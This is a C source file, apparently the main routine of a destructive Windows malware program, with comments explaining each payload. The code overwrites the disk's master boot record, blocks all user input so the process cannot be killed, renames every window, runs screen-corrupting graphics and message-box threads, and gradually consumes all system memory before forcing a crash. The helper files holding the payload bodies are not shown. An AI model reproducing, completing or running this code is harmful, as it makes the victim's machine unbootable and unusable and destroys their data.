#include <Windows.h>
#include <direct.h>
#include <string.h>
#include <wincrypt.h>

#include "data.c"
#include "wgdi-payloads.c"
#include "utils.c"
#include "wapi-payloads.c"

int main(){
	OverwriteBoot();				// overwrite mbr on disk. 512 bytes of MBR payload + zeroes so it reaches 1024 * 1024 * 2 bytes.

	CreateThread(0,0,CallWhiteNoise,0,0,0);		// Play white noise directly from resources.

	CreateThread(0,0,BlockInputFunc,0,0,0);		// This function blocks everything everywhere so you cannot use task manager. I added this because on Clown VM everyone's trying to kill process.
	CreateThread(0,0,RenameTextsFunc,0,0,0);	// Renaming all in windows into " " (space). 

	CreateThread(0,0,InvTimeTime,0,0,0);		// stupid name. this is DC screen repair. This malware is creating so much garbage on screen, so i added this to keep all clean.

	CreateThread(0,0,CallMoreDlgs,0,0,0);		// message boxez
	CreateThread(0,0,MoveWind,0,0,0);		// Move windows payload. 

	CreateThread(0,0,TunnelCorrupted,0,0,0);	// makes payloads a lil bit more random.
	CreateThread(0,0,WhiteGlitch,0,0,0);		// stupid and simple gdi payload. Nothing much here.
	
	Sleep(3000);

	CreateThread(0,0,RektOutOfMem,0,0,0);		// out-of-memory destruction. Slowly claim all memory Windows have.

	Sleep(120000);
	
	ExpressFuck();					// not sure if that will work here. Windows will run out of memory.
}
